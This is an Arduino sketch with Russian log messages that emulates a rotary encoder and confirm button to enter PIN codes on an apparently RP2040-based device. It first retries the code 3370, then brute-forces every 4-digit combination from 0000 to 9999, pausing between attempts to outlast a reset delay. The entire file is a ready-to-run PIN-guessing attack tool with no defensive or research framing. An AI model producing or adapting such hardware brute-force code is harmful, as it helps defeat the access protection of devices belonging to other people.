#include <Arduino.h>

#define CLK_MASK (1 << 0) // A0 (Регистр PORTC)
#define DT_MASK  (1 << 1) // A1 (Регистр PORTC)
#define SW_MASK  (1 << 6) // D6 (Регистр PORTD)

#define LED_PIN 8 

#define RESET_DELAY_MS 2300 

void setup() {
  Serial.begin(115200);

  DDRC |= CLK_MASK | DT_MASK;
  DDRD |= SW_MASK;
  
  PORTC |= CLK_MASK | DT_MASK;
  PORTD |= SW_MASK;

  pinMode(LED_PIN, INPUT);

  Serial.println(F("СИНХРОНИЗАЦИЯ С RP2040 УСПЕШНА"));
  Serial.println(F("Запуск полного перебора комбинаций"));
  delay(1000); 
}

inline void sendEncoderTick() {
  PORTC &= ~CLK_MASK; delayMicroseconds(4); 
  PORTC &= ~DT_MASK;  delayMicroseconds(4);
  PORTC |= CLK_MASK;  delayMicroseconds(4);
  PORTC |= DT_MASK;   delayMicroseconds(4);
}

inline void pressConfirmButton() {
  PORTD &= ~SW_MASK; delayMicroseconds(30);
  PORTD |= SW_MASK;  delayMicroseconds(30);
}


void inputDigit(uint8_t value) {
  for (uint8_t i = 0; i < value; i++) {
    sendEncoderTick();
    delay(400); 
  }
  pressConfirmButton();
  delay(8); 
}

void tryCombination(int c1, int c2, int c3, int c4) {
  inputDigit(c1);
  inputDigit(c2);
  inputDigit(c3);
  inputDigit(c4);
}

void loop() {

  Serial.println(F("Повторный ввод 3370"));
  tryCombination(3, 3, 7, 0);
  Serial.println(F("[TEST] Готово."));
  
  for (int c1 = 0; c1 <= 9; c1++) {
    for (int c2 = 0; c2 <= 9; c2++) {
      for (int c3 = 0; c3 <= 9; c3++) {
        for (int c4 = 0; c4 <= 9; c4++) {
          
          Serial.print(F("[*] Проверка: "));
          Serial.print(c1);
          Serial.print(c2);
          Serial.print(c3);
          Serial.println(c4);

          tryCombination(c1, c2, c3, c4);

          delay(50); 
          delay(RESET_DELAY_MS);
        }
      }
    }
  }

  while (true);
}
